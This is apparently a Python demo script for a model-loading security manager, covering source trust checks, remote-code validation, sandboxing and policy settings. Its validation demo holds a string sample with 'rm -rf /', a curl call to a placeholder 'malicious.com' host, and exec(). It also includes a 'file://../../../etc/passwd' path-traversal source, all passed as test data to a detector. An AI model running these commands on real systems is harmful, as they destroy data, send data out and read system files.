"""
Demo script for SafeLoadManager - Security and safe loading features

This script demonstrates the key functionality of the SafeLoadManager including:
- Security policy management
- Trusted source validation
- Remote code safety validation
- Sandboxed environment creation
- Safe loading options configuration
"""

import os
import tempfile
from pathlib import Path

from safe_load_manager import (
    SafeLoadManager,
    SecurityPolicy,
    SafeLoadingOptions,
    SecurityValidation
)


def demo_basic_functionality():
    """Demonstrate basic SafeLoadManager functionality"""
    print("=== SafeLoadManager Basic Functionality Demo ===\n")
    
    # Create SafeLoadManager with temporary config
    with tempfile.TemporaryDirectory() as temp_dir:
        config_path = os.path.join(temp_dir, "demo_security_config.json")
        manager = SafeLoadManager(config_path=config_path)
        
        print(f"1. Created SafeLoadManager in '{manager.mode}' mode")
        print(f"   Current policy: {manager.current_policy.name}")
        print(f"   Trusted sources: {len(manager.trusted_sources)}")
        
        # Test loading mode changes
        print("\n2. Testing loading mode changes:")
        manager.set_loading_mode("trust")
        print(f"   Mode changed to: {manager.mode}")
        
        manager.set_loading_mode("safe")
        print(f"   Mode changed to: {manager.mode}")
        
        # Test trusted source management
        print("\n3. Testing trusted source management:")
        test_source = "https://custom-models.com/my-model"
        print(f"   Is '{test_source}' trusted? {manager.is_source_trusted(test_source)}")
        
        manager.add_trusted_source(test_source)
        print(f"   Added to trusted sources")
        print(f"   Is '{test_source}' trusted now? {manager.is_source_trusted(test_source)}")
        
        # Test HuggingFace (should be trusted by default)
        hf_source = "https://huggingface.co/Wan-AI/Wan2.2-T2V-A14B-Diffusers"
        print(f"   Is HuggingFace model trusted? {manager.is_source_trusted(hf_source)}")


def demo_security_validation():
    """Demonstrate security validation features"""
    print("\n=== Security Validation Demo ===\n")
    
    manager = SafeLoadManager()
    
    # Test safe code
    print("1. Testing safe code validation:")
    safe_code = """
import torch
import torch.nn as nn

class WanModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.transformer = nn.Transformer()
        
    def forward(self, x):
        return self.transformer(x)
"""
    
    validation = manager.validate_remote_code_safety(
        "https://huggingface.co/safe-model", 
        safe_code
    )
    print(f"   Code safety: {validation.is_safe}")
    print(f"   Risk level: {validation.risk_level}")
    print(f"   Detected risks: {validation.detected_risks}")
    
    # Test dangerous code
    print("\n2. Testing dangerous code validation:")
    dangerous_code = """
import os
import subprocess

# Dangerous operations
os.system("rm -rf /")
subprocess.call(["curl", "http://malicious.com/steal-data"])
exec("malicious_code_here")
"""
    
    validation = manager.validate_remote_code_safety(
        "https://malicious.com/bad-model",
        dangerous_code
    )
    print(f"   Code safety: {validation.is_safe}")
    print(f"   Risk level: {validation.risk_level}")
    print(f"   Detected risks: {len(validation.detected_risks)} risks found")
    for risk in validation.detected_risks:
        print(f"     - {risk}")
    print(f"   Mitigation strategies: {len(validation.mitigation_strategies)} strategies")
    for strategy in validation.mitigation_strategies:
        print(f"     - {strategy}")


def demo_model_source_validation():
    """Demonstrate model source validation"""
    print("\n=== Model Source Validation Demo ===\n")
    
    manager = SafeLoadManager()
    
    test_sources = [
        "https://huggingface.co/Wan-AI/Wan2.2-T2V-A14B-Diffusers",
        "https://malicious.com/fake-model",
        "file://../../../etc/passwd",
        "/tmp/local-model",
        "https://github.com/user/model.git"
    ]
    
    for i, source in enumerate(test_sources, 1):
        print(f"{i}. Validating: {source}")
        validation = manager.validate_model_source(source)
        print(f"   Safe: {validation.is_safe}")
        print(f"   Risk level: {validation.risk_level}")
        if validation.detected_risks:
            print(f"   Risks: {', '.join(validation.detected_risks)}")
        print()


def demo_safe_loading_options():
    """Demonstrate safe loading options"""
    print("\n=== Safe Loading Options Demo ===\n")
    
    manager = SafeLoadManager()
    
    # Test trusted source
    print("1. Safe loading options for trusted source:")
    trusted_source = "https://huggingface.co/trusted-model"
    options = manager.get_safe_loading_options(trusted_source)
    print(f"   Source: {trusted_source}")
    print(f"   Allow remote code: {options.allow_remote_code}")
    print(f"   Use sandbox: {options.use_sandbox}")
    print(f"   Timeout: {options.timeout_seconds}s")
    print(f"   Memory limit: {options.memory_limit_mb}MB")
    
    # Test untrusted source
    print("\n2. Safe loading options for untrusted source:")
    untrusted_source = "https://suspicious.com/model"
    options = manager.get_safe_loading_options(untrusted_source)
    print(f"   Source: {untrusted_source}")
    print(f"   Allow remote code: {options.allow_remote_code}")
    print(f"   Use sandbox: {options.use_sandbox}")
    print(f"   Restricted operations: {options.restricted_operations}")
    print(f"   Timeout: {options.timeout_seconds}s")
    print(f"   Memory limit: {options.memory_limit_mb}MB")
    
    # Test in trust mode
    print("\n3. Same untrusted source in 'trust' mode:")
    manager.set_loading_mode("trust")
    options = manager.get_safe_loading_options(untrusted_source)
    print(f"   Allow remote code: {options.allow_remote_code}")
    print(f"   Use sandbox: {options.use_sandbox}")


def demo_sandbox_environment():
    """Demonstrate sandbox environment"""
    print("\n=== Sandbox Environment Demo ===\n")
    
    manager = SafeLoadManager()
    
    print("1. Creating sandboxed environment:")
    restrictions = ["network_access", "file_system"]
    sandbox = manager.create_sandboxed_environment(restrictions)
    
    print(f"   Sandbox directory: {sandbox.temp_dir}")
    print(f"   Restrictions: {sandbox.restrictions}")
    print(f"   Initially active: {sandbox.is_active}")
    
    print("\n2. Testing sandbox activation:")
    original_proxy = os.environ.get("HTTP_PROXY", "not_set")
    print(f"   Original HTTP_PROXY: {original_proxy}")
    
    with sandbox:
        print(f"   Sandbox active: {sandbox.is_active}")
        print(f"   HTTP_PROXY in sandbox: {os.environ.get('HTTP_PROXY', 'not_set')}")
        
        # Test executing function in sandbox
        def test_function(a, b):
            return f"Executed in sandbox: {a} + {b} = {a + b}"
            
        result = sandbox.execute_in_sandbox(test_function, 5, 3)
        print(f"   Function result: {result}")
    
    print(f"   Sandbox active after exit: {sandbox.is_active}")
    print(f"   HTTP_PROXY after exit: {os.environ.get('HTTP_PROXY', 'not_set')}")


def demo_security_policies():
    """Demonstrate security policy management"""
    print("\n=== Security Policy Management Demo ===\n")
    
    with tempfile.TemporaryDirectory() as temp_dir:
        config_path = os.path.join(temp_dir, "demo_config.json")
        manager = SafeLoadManager(config_path=config_path)
        
        print("1. Default security policy:")
        default_policy = manager.current_policy
        print(f"   Name: {default_policy.name}")
        print(f"   Allow remote code: {default_policy.allow_remote_code}")
        print(f"   Trusted domains: {default_policy.trusted_domains}")
        print(f"   Sandbox required: {default_policy.sandbox_required}")
        
        # Create custom policy
        print("\n2. Creating custom security policy:")
        custom_policy = SecurityPolicy(
            name="development",
            description="Development environment policy",
            allow_remote_code=True,
            trusted_domains=["huggingface.co", "github.com", "localhost"],
            blocked_domains=["malicious.com", "suspicious.net"],
            max_file_size_mb=500,
            allowed_file_extensions=[".py", ".json", ".txt", ".md", ".yaml"],
            restricted_operations=["network_access"],  # Only restrict network
            sandbox_required=False
        )
        
        manager.security_policies["development"] = custom_policy
        manager.set_security_policy("development")
        
        print(f"   Created and activated policy: {custom_policy.name}")
        print(f"   Description: {custom_policy.description}")
        print(f"   Trusted domains: {custom_policy.trusted_domains}")
        print(f"   Blocked domains: {custom_policy.blocked_domains}")
        
        # Test policy effects
        print("\n3. Testing policy effects:")
        github_model = "https://github.com/user/model"
        options = manager.get_safe_loading_options(github_model)
        print(f"   GitHub model loading options:")
        print(f"     Allow remote code: {options.allow_remote_code}")
        print(f"     Use sandbox: {options.use_sandbox}")
        
        # Save and reload configuration
        print("\n4. Testing configuration persistence:")
        manager.save_configuration()
        print(f"   Configuration saved to: {config_path}")
        
        # Create new manager and verify policy loaded
        new_manager = SafeLoadManager(config_path=config_path)
        print(f"   New manager loaded policies: {list(new_manager.security_policies.keys())}")
        print(f"   Development policy preserved: {'development' in new_manager.security_policies}")


def demo_secure_loading_context():
    """Demonstrate secure loading context manager"""
    print("\n=== Secure Loading Context Demo ===\n")
    
    manager = SafeLoadManager()
    
    models_to_test = [
        "https://huggingface.co/Wan-AI/Wan2.2-T2V-A14B-Diffusers",
        "https://suspicious.com/untrusted-model"
    ]
    
    for i, model_path in enumerate(models_to_test, 1):
        print(f"{i}. Testing secure loading for: {model_path}")
        
        try:
            with manager.secure_model_loading(model_path) as options:
                print(f"   Secure loading context active")
                print(f"   Allow remote code: {options.allow_remote_code}")
                print(f"   Use sandbox: {options.use_sandbox}")
                print(f"   Timeout: {options.timeout_seconds}s")
                
                # Simulate model loading
                print(f"   [Simulating model loading...]")
                print(f"   Model loading completed successfully")
                
        except Exception as e:
            print(f"   Error in secure loading: {e}")
        
        print()


def main():
    """Run all demos"""
    print("SafeLoadManager Security Features Demo")
    print("=" * 50)
    
    try:
        demo_basic_functionality()
        demo_security_validation()
        demo_model_source_validation()
        demo_safe_loading_options()
        demo_sandbox_environment()
        demo_security_policies()
        demo_secure_loading_context()
        
        print("\n" + "=" * 50)
        print("Demo completed successfully!")
        print("\nKey features demonstrated:")
        print("✓ Basic SafeLoadManager functionality")
        print("✓ Security validation for remote code")
        print("✓ Model source validation")
        print("✓ Safe loading options configuration")
        print("✓ Sandboxed environment creation")
        print("✓ Security policy management")
        print("✓ Secure loading context manager")
        
    except Exception as e:
        print(f"\nDemo failed with error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()